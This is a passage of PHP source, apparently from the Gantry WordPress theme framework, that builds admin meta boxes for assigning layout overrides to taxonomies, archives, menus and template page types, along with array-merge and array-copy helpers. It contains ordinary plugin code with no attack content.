			$type->type_label                                             = sprintf(_g('Taxonomy: %s'), $tax->labels->name);
			$type->type                                                   = $tax->name;
			$type->single_label                                           = sprintf(_g('Taxonomy: %s'), $tax->labels->singular_name);
			$gantry_override_types[$type->archetype . '::' . $type->type] = $type;
			add_meta_box($type->archetype . '_' . $type->type, $type->type_label, 'gantry_assignment_item_taxonomy_meta_box', 'gantry_assignments', 'panel', 'default', $type);
		}
	}
}

/**
 * Creates metaboxes for any taxonomy menu item.
 *
 * @since 3.0.0
 */
function gantry_assignment_archives_meta_boxes()
{
	global $gantry_override_types;
	$taxonomies = get_taxonomies(array('show_ui' => true), 'object');

	if (!$taxonomies) return;

	$taxonomies = array_copy($taxonomies);

	foreach ($taxonomies as $tax) {
		$tax = apply_filters('gantry_assignment_meta_box_object', $tax);
		if ($tax) {
			$type                                                         = new AssignmentType();
			$type->name                                                   = $tax->name;
			$type->archetype                                              = "archive";
			$type->type_label                                             = sprintf(_g('Archives: %s'), $tax->labels->name);
			$type->type                                                   = $tax->name;
			$type->single_label                                           = sprintf(_g('Archive: %s'), $tax->labels->singular_name);
			$gantry_override_types[$type->archetype . '::' . $type->type] = $type;
			add_meta_box($type->archetype . '_' . $type->type, $type->type_label, 'gantry_assignment_item_taxonomy_meta_box', 'gantry_assignments', 'panel', 'default', $type);
		}
	}
}

/**
 * Displays a metabox for a taxonomy menu item.
 *
 * @since 3.0.0
 *
 * @param string $object   Not used.
 * @param string $taxonomy The taxonomy object.
 */
function gantry_assignment_item_taxonomy_meta_box($object, $taxonomy, $assignments)
{
	$taxonomy_name = $taxonomy['args']->name;

	$args = array(
		'child_of'                 => 0,
		'exclude'                  => '',
		'hide_empty'               => false,
		'hierarchical'             => 1,
		'include'                  => '',
		'include_last_update_time' => false,
		'order'                    => 'ASC',
		'orderby'                  => 'name',
		'pad_counts'               => false,
	);

	$terms = get_terms($taxonomy_name, $args);

	if (!$terms || is_wp_error($terms)) {
		echo '<p>' . _g('No items.') . '</p>';
		return;
	}

	$walker              = new GantryAssignmentWalker();
	$args['walker']      = $walker;
	$args['assignments'] = $assignments;

	$newterms = array();
	foreach ($terms as $term_key => $term) {
		$item                = new AssignmentItem();
		$item->archetype     = $taxonomy['args']->archetype;
		$item->type          = $taxonomy_name;
		$item->id            = $term->term_id;
		$item->single_label  = $taxonomy['args']->single_label;
		$item->title         = $term->name;
		$item->preview_url   = get_term_link($term, $term->taxonomy);
		$item->parent_id     = $term->parent;
		$newterms[$term_key] = $item;
	}
	$terms = $newterms;

	?>
	<div id="taxonomy-<?php echo $taxonomy_name; ?>" class="taxonomydiv">
		<ul id="<?php echo $taxonomy_name; ?>checklist"
		    class="list:<?php echo $taxonomy_name?> categorychecklist form-no-clear">
			<?php
			echo gantry_walk_assignment_tree($terms, 0, (object)$args);
			?>
		</ul>
	</div><!-- /.taxonomydiv -->
<?php

}


function gantry_assignment_menus_meta_boxes()
{
	$menus = wp_get_nav_menus(array('orderby' => 'name'));
	if (!$menus) return;

	foreach ($menus as $menu) {
		$menu = apply_filters('gantry_assignment_meta_box_object', $menu);
		if ($menu) {
			$type               = new AssignmentType();
			$type->name         = $menu->name;
			$type->archetype    = "menu";
			$type->type_label   = sprintf(_g('Menu: %s'), $menu->name);
			$type->type         = $menu->name;
			$type->single_label = sprintf(_g('Menu: %s'), $menu->name);
			add_meta_box($type->archetype . '_' . $type->type, sprintf(_g('Menu: %s'), $type->name), 'gantry_assignment_item_menu_meta_box', 'gantry_assignments', 'panel', 'default', $type);
		}
	}

}

function gantry_assignment_item_menu_meta_box($object, $menu, $assignments)
{
	$menu_name = $menu['args']->name;

	$args = array(
		'child_of'                 => 0,
		'exclude'                  => '',
		'hide_empty'               => false,
		'hierarchical'             => 1,
		'include'                  => '',
		'include_last_update_time' => false,
		'order'                    => 'ASC',
		'orderby'                  => 'name',
		'pad_counts'               => false,
	);

	$menu_items = wp_get_nav_menu_items($menu_name);

	if (!$menu_items || is_wp_error($menu_items)) {
		echo '<p>' . _g('No items.') . '</p>';
		return;
	}

	foreach ($menu_items as $menu_item) {
		$menu_item->menu_id = $menu_name;
	}

	$menu_entires = array();
	foreach ($menu_items as $menu_item) {
		$item               = new AssignmentItem();
		$item->archetype    = $menu['args']->archetype;
		$item->type         = $menu_name;
		$item->id           = $menu_item->ID;
		$item->single_label = $menu['args']->single_label;
		$item->parent_id    = empty($menu_item->menu_item_parent) ? get_post_meta($menu_item->ID, '_menu_item_menu_item_parent', true) : $menu_item->menu_item_parent;

		// Get the title and url info
		$menu_item->object_id = empty($menu_item->object_id) ? get_post_meta($menu_item->ID, '_menu_item_object_id', true) : $menu_item->object_id;
		$menu_item->object    = empty($menu_item->object) ? get_post_meta($menu_item->ID, '_menu_item_object', true) : $menu_item->object;
		$menu_item->type      = empty($menu_item->type) ? get_post_meta($menu_item->ID, '_menu_item_type', true) : $menu_item->type;
		if ('post_type' == $menu_item->type) {
			$object           = get_post_type_object($menu_item->object);
			$menu_item->url   = get_permalink($menu_item->object_id);
			$original_object  = get_post($menu_item->object_id);
			$original_title   = $original_object->post_title;
			$menu_item->title = '' == $menu_item->post_title ? $original_title : $menu_item->post_title;

		} elseif ('taxonomy' == $menu_item->type) {
			$object           = get_taxonomy($menu_item->object);
			$term_url         = get_term_link((int)$menu_item->object_id, $menu_item->object);
			$menu_item->url   = !is_wp_error($term_url) ? $term_url : '';
			$original_title   = get_term_field('name', $menu_item->object_id, $menu_item->object, 'raw');
			$menu_item->title = '' == $menu_item->post_title ? $original_title : $menu_item->post_title;

		} else {
			$menu_item->title = $menu_item->post_title;
			$menu_item->url   = empty($menu_item->url) ? get_post_meta($menu_item->ID, '_menu_item_url', true) : $menu_item->url;
		}

		$item->title    = $menu_item->title;
		$menu_entires[] = $item;
	}

	$walker              = new GantryAssignmentWalker();
	$args['assignments'] = $assignments;

	?>
	<div id="menu-<?php echo $menu_name; ?>" class="menudiv">
		<ul id="<?php echo $menu_name; ?>checklist"
		    class="list:<?php echo $menu_name?> categorychecklist form-no-clear">
			<?php
			$args['walker'] = $walker;
			echo gantry_walk_assignment_tree($menu_entires, 0, (object)$args);
			?>
		</ul>
	</div><!-- /.menudiv -->
<?php

}

function gantry_assignment_template_pages_meta_boxes()
{
	$type               = new AssignmentType();
	$type->archetype    = "templatepage";
	$type->type_label   = _g('Template Page Types');
	$type->single_label = _g('Template Page Type');
	$type->name         = _g('Template Page Type');
	$menu               = apply_filters('gantry_assignment_meta_box_object', $type);
	add_meta_box($type->archetype, _g('Template Page Types'), 'gantry_assignment_item_template_pages_meta_box', 'gantry_assignments', 'panel', 'high', $type);
}

function gantry_assignment_item_template_pages_meta_box($object, $box, $assignments)
{
	$templatepages_name = $box['args']->name;
	$args               = array(
		'child_of'                 => 0,
		'exclude'                  => '',
		'hide_empty'               => false,
		'hierarchical'             => 0,
		'include'                  => '',
		'include_last_update_time' => false,
		'order'                    => 'ASC',
		'orderby'                  => 'name',
		'pad_counts'               => false,
	);
	$page_types         = array(
		'404'            => _g('404 Not Found Page'),
		'search'         => _g('Search Page'),
		'tax'            => _g('Taxonomy Archive Page'),
		'front_page'     => _g('Front Page'),
		'home'           => _g('Home Page'),
		'attachment'     => _g('Attachment Page'),
		'single'         => _g('Single Post Page'),
		'page'           => _g('PAGE page'),
		'category'       => _g('Category Archive Page'),
		'tag'            => _g('Tag Archive Page'),
		'author'         => _g('Author Page'),
		'date'           => _g('Date Archive Page'),
		'preview'        => _g('Preview Page'),
		'comments_popup' => _g('Comments Popup Page')
	);

	$page_types = apply_filters('gantry_admin_page_types', $page_types);

	ksort($page_types);
	$template_page_types = array();
	foreach ($page_types as $page_type_id => $page_type_name) {
		$item                  = new AssignmentItem();
		$item->archetype       = $box['args']->archetype;
		$item->type            = $page_type_id;
		$item->title           = $page_type_name;
		$item->parent_id       = 0;
		$item->single_label    = sprintf(_g('Template Page Type'), $page_type_name);
		$template_page_types[] = $item;
	}
	$args['assignments'] = $assignments;
	$walker              = new GantryAssignmentWalker();

	?>
	<div id="templatepage-<?php echo $templatepages_name; ?>" class="templatepagediv">
		<ul id="<?php echo $templatepages_name; ?>checklist"
		    class="list:<?php echo $templatepages_name?> categorychecklist form-no-clear">
			<?php
			$args['walker'] = $walker;
			echo gantry_walk_assignment_tree($template_page_types, 0, (object)$args);
			?>
		</ul>
	</div>
<?php

}


function gantry_walk_assignment_tree($items, $depth, $r)
{
	$walker = (empty($r->walker)) ? new GantryAssignmentWalker : $r->walker;
	$args   = array($items, $depth, $r);
	return call_user_func_array(array(&$walker, 'walk'), $args);
}

function do_assignment_meta_boxes($page, $context, $object, $assignments = array(), &$assignment_info = array())
{
	global $wp_meta_boxes;
	global $gantry_override_assignment_info;
	static $already_sorted = false;


	$hidden = get_hidden_meta_boxes($page);

	printf('<div id="%s-sortables" class="meta-box-sortables clearfix">', htmlspecialchars($context));

	$i = 0;
	do {
		// Grab the ones the user has manually sorted. Pull them out of their previous context/priority and into the one the user chose
		if (!$already_sorted && $sorted = get_user_option("meta-box-order_$page")) {
			foreach ($sorted as $box_context => $ids) foreach (explode(',', $ids) as $id) if ($id) add_meta_box($id, null, null, $page, $box_context, 'sorted');
		}
		$already_sorted = true;

		if (!isset($wp_meta_boxes) || !isset($wp_meta_boxes[$page]) || !isset($wp_meta_boxes[$page][$context])) break;

		$skip_checkbox = array('templatepage', 'menu', 'taxonomy');

		foreach (array('high', 'sorted', 'core', 'default', 'low') as $priority) {
			if (isset($wp_meta_boxes[$page][$context][$priority])) {
				foreach ((array)$wp_meta_boxes[$page][$context][$priority] as $box) {
					if (false == $box || !$box['title']) continue;
					$i++;
					$style = '';

					//echo '<div id="' . $box['id'] . '" class="postbox ' . postbox_classes($box['id'], $page) . $hidden_class . '" ' . '>' . "\n";

					$data     = $box['args'];
					$assigned = "";
					$checked  = "";
					if (isset($assignments[$data->archetype]) && isset($assignments[$data->archetype][$data->type]) && is_bool($assignments[$data->archetype][$data->type]) && $assignments[$data->archetype][$data->type] === true) {
						$assigned                                                               = " added";
						$checked                                                                = ' checked="checked"';
						$data->single_label                                                     = _g('Type');
						$gantry_override_assignment_info[$data->archetype . '::' . $data->type] = $data;
					}

					$position = ($i % 3 == 0) ? 'right': (($i % 3 == 1) ? 'left' : 'center');
					$position = 'assignments-block-' . $position;


					echo '<div id="' . $box['id'] . '"  class="assignments-block '.$position.'">' . "\n";
					echo "	<h2 class='" . strtolower(str_replace(" ", "-", $box['title'])) . "'>\n";
					if (!in_array($data->archetype, $skip_checkbox)) {
						echo "		<label class=\"global menu-item-" . $box['id'] . "\">\n";
						echo '			<input class="assignment-checkbox global" ' . $checked . ' type="checkbox" name="menu-item-' . $box['id'] . '" value="' . $box['id'] . '" />' . "\n";
						echo " 		</label>\n";
					}
					echo '		<span class="' . $data->archetype . '::' . $data->type . '">' . $box['title'] . "</span></h2>\n";

					echo '	<div class="assignment-search"><input type="text" placeholder="Start typing to filter the list."/><div class="assignment-search-clear">&times;</div></div>'."\n";

					echo '	<div class="inside' . $assigned . '">' . "\n";
					call_user_func($box['callback'], $object, $box, $assignments);
					echo "	</div>\n";
					echo "	<div class=\"footer-block clearfix\">\n";
					echo "		<div class=\"select-all\"><a href=\"#\">Select All</a></div>\n";
					echo "		<div class=\"add-button\"><input class=\"button-secondary add-to-assigned\" type=\"button\" value=\"Add to Assigned\" /></div>\n";
					echo "	</div>\n";
					echo "</div>\n";

					//echo "</div>\n";
				}
			}
		}
	} while (0);

	echo "</div>";

	return $i;

}

class AssignmentItem
{
	var $archetype;
	var $type;
	var $id;
	var $parent_id;
	var $title;
	var $preview_url;
	var $single_label;
}

class AssignmentType
{
	var $archetype;
	var $type;
	var $title;
	var $type_label;
	var $single_label;
	var $name;
}

/**
 * Merges any number of arrays of any dimensions, the later overwriting
 * previous keys, unless the key is numeric, in whitch case, duplicated
 * values will not be added.
 *
 * The arrays to be merged are passed as arguments to the function.
 *
 * @access public
 * @return array Resulting array, once all have been merged
 */
function array_merge_replace_recursive()
{
	// Holds all the arrays passed
	$params = func_get_args();

	// First array is used as the base, everything else overwrites on it
	$ret = array_shift($params);

	// Merge all arrays on the first array
	foreach ($params as $array) {
		foreach ($array as $key => $value) {
			// Numeric keyed values are added (unless already there)
			if (is_numeric($key) && (!in_array($value, $ret))) {
				if (is_array($value)) {
					$ret[] = array_merge_replace_recursive($ret[$$key], $value);
				} else {
					$ret[] = $value;
				}

				// String keyed values are replaced
			} else {
				if (isset ($ret[$key]) && is_array($value) && is_array($ret[$key])) {
					$ret[$key] = array_merge_replace_recursive($ret[$key], $value);
				} else {
					$ret[$key] = $value;
				}
			}
		}
	}

	return $ret;
}

/**
 * make a recursive copy of an array
 *
 * @param array $aSource
 *
 * @return array    copy of source array
 */
function array_copy($aSource)
{
	// check if input is really an array
	if (!is_array($aSource)) {
		throw new Exception("Input is not an Array");
	}

	// initialize return array
	$aRetAr = array();

	// get array keys
	$aKeys = array_keys($aSource);
	// get array values
	$aVals = array_values($aSource);

	// loop through array and assign keys+values to new return array
	for ($x = 0; $x < count($aKeys); $x++) {
		// clone if object
		if (is_object($aVals[$x])) {
			$aRetAr[$aKeys[$x]] = clone $aVals[$x];
			// recursively add array
		} elseif (is_array($aVals[$x])) {
			$aRetAr[$aKeys[$x]] = array_copy($aVals[$x]);
			// assign just a plain scalar value
		} else {
			$aRetAr[$aKeys[$x]] = $aVals[$x];
		}
	}

	return $aRetAr;
}
